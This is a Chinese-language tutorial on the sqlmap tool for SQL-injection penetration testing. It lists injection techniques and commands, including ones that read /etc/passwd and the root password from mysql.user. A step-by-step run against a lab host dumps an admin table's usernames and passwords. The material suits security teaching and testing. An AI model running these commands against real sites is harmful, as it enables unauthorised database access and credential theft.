---
title: 如何使用 sqlmap 进行数据库渗透测试
date: 2024-12-25T14:00:22+08:00
author: LiangMingJian
---

# 概述

**sqlmap 是一个开源的数据库渗透测试工具，它自动化了 sql 检测，注入的过程。**

[ sqlmap官网下载 ](http://sqlmap.org/)

```bash
# 进入 sqlmap 源码文件夹，因为 sqlmap 用的是 python2 编写的，需要编译后使用
tar zxvf sqlmap.tar.gz
cd sqlmap
./sqlmap.py
# 创建 sqlmap 命令
ln -s /root/sqlmapproject-sqlmap-7eab1bc/sqlmap.py /usr/bin/sqlmap
sqlmap -h # 帮助命令
```

# 支持的语法

sqlmap 命令选项被归类为目标（Target）、请求（Request）、优化、注入、检测、技巧（Techniques）、指纹、枚举等。当给 sqlmap 一个 url 的时候，它会执行如下操作：

1. 判断可注入的参数
2. 判断可以用那种 sql 注入技术来注入
3. 识别出哪种数据库
4. 根据用户选择，读取哪些数据

# 支持的数据库

MySQL， Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite 等

# 支持的注入模式

- 基于布尔的盲注，即可以根据返回页面判断条件真假的注入
- 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断
- 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中
- 联合查询注入，可以使用 union 的情况下的注入
- 堆查询注入，可以同时执行多条语句的执行时的注入

# 基本使用

```bash
sqlmap -u "http://ooxx.com.tw/star_photo.php?artist_id=11"        # 检查注入点 
sqlmap -u "http://ooxx.com.tw/star_photo.php?artist_id=11" --dbs  # 列出数据库信息    
sqlmap -u "http://ooxx.com.tw/star_photo.php?artist_id=11" -D xxxxx --tables            # 指定库名, 并列出所有表
sqlmap -u "http://ooxx.com.tw/star_photo.php?artist_id=11" -D xxxxx -T admin --columns  # 指定库名, 并表名列出所有字段
                                                                               
sqlmap -u "注入地址" -v 1 --dbs              # 列出数据库   
sqlmap -u "注入地址" -v 1 --current-db       # 列出当前数据库  
sqlmap -u "注入地址" -v 1 --users            # 列出数据库用户  
sqlmap -u "注入地址" -v 1 --current-user     # 列出当前用户  
sqlmap -u "注入地址" -v 1 --tables -D "数据库"                         # 列出数据库的表名  
sqlmap -u "注入地址" -v 1 --columns -T "表名" -D "数据库"               # 获取表的列名  
sqlmap -u "注入地址" -v 1 --dump -C "字段,字段" -T "表名" -D "数据库"    # 获取表中的数据   

# 指定参数注入 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 -p "id" 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 -p "cat,id" 
# 指定方法和post的数据 
sqlmap -u "http://192.168.1.47/page.php" --method "POST" --data "id=1&cat=2" 
# 指定cookie,可以注入一些需要登录的地址 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" --cookie "COOKIE_VALUE" 
# 指定关键词，也可以不指定。程序会根据返回结果的hash自动判断 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" --string "STRING_ON_TRUE_PAGE" 
# 显示指定的文件内容，一般用于php 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" --file-read /etc/passwd 
# 执行你自己的sql语句
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 --sql-query="SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" 
# union注入 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" --union-check 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 --union-use --banner 
# 保存注入过程到一个文件, 支持从文件恢复出注入过程 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 -b -o "sqlmap.log" 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 --banner -o "sqlmap.log" --resume
```

# 常用的参数

- `*`：在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分。sqlmap 可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。比如：`'/admin/1/'`，sqlmap 无法自动识别注入点，对于这种网页，可以直接在参数后加上一个星号，手动标注注入位置，如`sqlmap -u "www.baidu.com/admin/1*"`
- `--data`：使用 post 方式提交时，需要用到 data 参数
- `-p`：当我们已经事先知道哪一个参数存在注入就可以直接使用 -p 来指定，从而减少运行时间
- `--level`：不同的 level 等级，当 level 的参数设定为 2 或者 2 以上的时候，sqlmap 会尝试注入 Cookie 参数；当 level 参数设定为 3 或者 3 以上的时候，会尝试对 User-Angent，Referer 进行注入。
- `--technique`：这个参数可以指定 sqlmap 使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：B：Boolean-based blind SQL injection（布尔型注入）；E：Error-based SQL injection（报错型注入）；U：UNION query SQL injection（可联合查询注入）；S：Stacked queries SQL injection（可多语句查询注入）；T：Time-based blind SQL injection（基于时间延迟注入）

# 示例

## 第一步：查找注入点

输入：`sqlmap -u '192.168.3.59/article.php?id=1'`。

输出：出现`Parameter: id (GET)`等内容，存在注入点。

```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.1.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 11:30:43

[11:30:43] [INFO] resuming back-end DBMS 'mysql' 
[11:30:43] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1817=1817

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-2184 UNION ALL SELECT NULL,CONCAT(0x716b707071,0x517964767671746351415543654b4b794171664b78754b57434b70774c6b56434b6a46786a4d5a76,0x717a706271)-- BgjA
---
[11:30:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:30:43] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.3.59'

[*] shutting down at 11:30:43
```

## 第二步：查找数据库

输入：`sqlmap -u '192.168.3.59/article.php?id=1' --dbs'`。

输出：注入发现两个数据库`information_schema`和`website`。`information_schema`主要是数据库、表、列的信息，没有什么用处，`website`是网站的数据。

```
........
[11:37:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:37:43] [INFO] fetching database names
[11:37:43] [INFO] the SQL query used returns 2 entries
[11:37:43] [INFO] retrieved: information_schema
[11:37:43] [INFO] retrieved: website
available databases [2]:                                                       
[*] information_schema
[*] website
......
```

## 第三步：注入

输入：`sqlmap -u '192.168.3.59/article.php?id=1' -D website --tables'。`

输出：发现有两张表`admin、articles`。

```
..........
[11:41:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:41:14] [INFO] fetching tables for database: 'website'
[11:41:14] [INFO] the SQL query used returns 2 entries
[11:41:14] [INFO] retrieved: admin
[11:41:14] [INFO] retrieved: articles
Database: website                                                              
[2 tables]
+----------+
| admin    |
| articles |
+----------+
..........
```

## 第四步：读取数据

输入：`sqlmap -u '192.168.3.59/article.php?id=1' -D website -T admin --columns`。

输出：注入得到了三列`user、id、pass`。

```
..............
[11:43:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:43:46] [INFO] fetching columns for table 'admin' in database 'website'
[11:43:47] [INFO] the SQL query used returns 3 entries
[11:43:47] [INFO] retrieved: "id","int(11)"
[11:43:47] [INFO] retrieved: "user","text"
[11:43:47] [INFO] retrieved: "pass","text"
Database: website                                                              
Table: admin
[3 columns]
+--------+---------+
| Column | Type    |
+--------+---------+
| user   | text    |
| id     | int(11) |
| pass   | text    |
+--------+---------+
............
```

## 第五步：查看数据

输入：`sqlmap -u '192.168.3.59/article.php?id=1' -D website -T admin -C user,pass --dump`。

输出：可以查看到用户名与密码。

```
..........
[11:47:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:47:33] [INFO] fetching entries of column(s) '`user`, pass' for table 'admin' in database 'website'
[11:47:33] [INFO] the SQL query used returns 3 entries
[11:47:33] [INFO] retrieved: "test1","123456"
[11:47:33] [INFO] retrieved: "test2","123456"
[11:47:33] [INFO] retrieved: "test3","123456"
Database: website                                                              
Table: admin
[3 entries]
+--------+--------+
| user   | pass   |
+--------+--------+
| test1  | 123456 |
| test2  | 123456 |
| test3  | 123456 |
+--------+--------+
............
```
